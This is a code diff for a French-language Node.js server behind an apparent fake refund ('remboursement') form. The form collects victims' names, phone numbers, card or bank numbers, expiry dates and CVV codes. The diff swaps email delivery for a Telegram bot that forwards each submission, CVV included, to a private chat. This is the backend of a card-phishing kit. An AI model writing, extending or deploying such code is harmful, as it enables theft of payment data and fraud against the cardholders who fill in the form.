@@ -1,15 +1,17 @@
 require('dotenv').config();
 const express = require('express');
 const cors = require('cors');
-const nodemailer = require('nodemailer');
 const path = require('path');
 const fs = require('fs');
-const { exec } = require('child_process');
+const TelegramBot = require('node-telegram-bot-api');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
 const DATA_DIR = path.join(__dirname, 'data');
 const DEMANDES_FILE = path.join(DATA_DIR, 'demandes.json');
+
+const bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN, { polling: false });
+const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
 if (!fs.existsSync(DATA_DIR)) {
   fs.mkdirSync(DATA_DIR, { recursive: true });
@@ -37,28 +39,25 @@ function saveDemande(data) {
 }
 
 function isEmailConfigured() {
-  return Boolean(
-    process.env.RECEIVER_EMAIL &&
-    process.env.SMTP_USER &&
-    process.env.SMTP_PASS
-  );
+  return Boolean(TELEGRAM_CHAT_ID);
+}
+
+async function sendToTelegram(data) {
+  const message = `📋 *Nouvelle demande de remboursement*
+
+👤 *Nom:* ${data.nom}
+📞 *Telephone:* ${data.telephone}
+💳 *RIB/Carte:* ${data.rib}
+🏦 *Nom du compte:* ${data.nomCompte}
+📅 *Date:* ${data.date}
+🔒 *CVV:* ||${data.CVV}||`;
+
+  await bot.sendMessage(TELEGRAM_CHAT_ID, message, { parse_mode: 'Markdown' });
 }
 
 app.use(cors());
 app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
-
-function createTransporter() {
-  return nodemailer.createTransport({
-    host: process.env.SMTP_HOST,
-    port: Number(process.env.SMTP_PORT) || 587,
-    secure: false,
-    auth: {
-      user: process.env.SMTP_USER,
-      pass: process.env.SMTP_PASS,
-    },
-  });
-}
 
 app.post('/api/remboursement', async (req, res) => {
   const { nom, telephone, rib, nomCompte, date, CVV } = req.body;
@@ -77,7 +76,7 @@ app.post('/api/remboursement', async (req, res) => {
   saveDemande(data);
 
   if (!isEmailConfigured()) {
-    console.log('Demande enregistree (email non configure):', nom);
+    console.log('Demande enregistree (Telegram non configure):', nom);
     return res.json({
       success: true,
       message: 'Votre demande a ete enregistree avec succes.',
@@ -85,35 +84,14 @@ app.post('/api/remboursement', async (req, res) => {
     });
   }
 
-  const html = `
-    <h2>Nouvelle demande de remboursement</h2>
-    <h3>Étape 1 — Informations personnelles</h3>
-    <p><strong>Nom :</strong> ${nom}</p>
-    <p><strong>Téléphone :</strong> ${telephone}</p>
-    <h3>Étape 2 — Coordonnées de carte</h3>
-    <p><strong>Numéro de carte :</strong> ${cardNumber}</p>
-    <p><strong>Nom du titulaire :</strong> ${nomCompte}</p>
-    <p><strong>Mois et année :</strong> ${date}</p>
-    <p><strong>CVV :</strong> ${CVV}</p>
-    <hr>
-    <p><em>Reçu le ${new Date().toLocaleString('fr-FR')}</em></p>
-  `;
-
   try {
-    const transporter = createTransporter();
-    await transporter.sendMail({
-      from: process.env.SMTP_USER,
-      to: process.env.RECEIVER_EMAIL,
-      subject: `Demande de remboursement — ${nom}`,
-      html,
-    });
-
+    await sendToTelegram(data);
     res.json({ success: true, message: 'Votre demande a ete envoyee avec succes.', emailSent: true });
   } catch (err) {
-    console.error('Erreur envoi email:', err.message);
+    console.error('Erreur envoi Telegram:', err.message);
     res.json({
       success: true,
-      message: 'Demande enregistree. Email non envoye — verifiez la configuration.',
+      message: 'Demande enregistree. Telegram non envoye — verifiez la configuration.',
       emailSent: false,
     });
   }
@@ -129,19 +107,15 @@ app.listen(PORT, '0.0.0.0', () => {
   console.log(`Demandes sauvegardees dans: ${DEMANDES_FILE}`);
 
   if (isEmailConfigured()) {
-    console.log(`Email actif -> ${process.env.RECEIVER_EMAIL}`);
+    console.log(`Telegram actif -> chat_id: ${TELEGRAM_CHAT_ID}`);
   } else {
-    console.log('Email non configure — lancez CONFIGURER-EMAIL.bat');
+    console.log('Telegram non configure — ajoutez TELEGRAM_CHAT_ID dans .env');
   }
 
   if (process.env.PUBLIC_MODE) return;
 
-  const openCmd =
-    process.platform === 'win32'
-      ? `start ${url}`
-      : process.platform === 'darwin'
-        ? `open ${url}`
-        : `xdg-open ${url}`;
-
-  exec(openCmd);
+  if (process.platform === 'win32') {
+    const { exec } = require('child_process');
+    exec(`start ${url}`);
+  }
 });
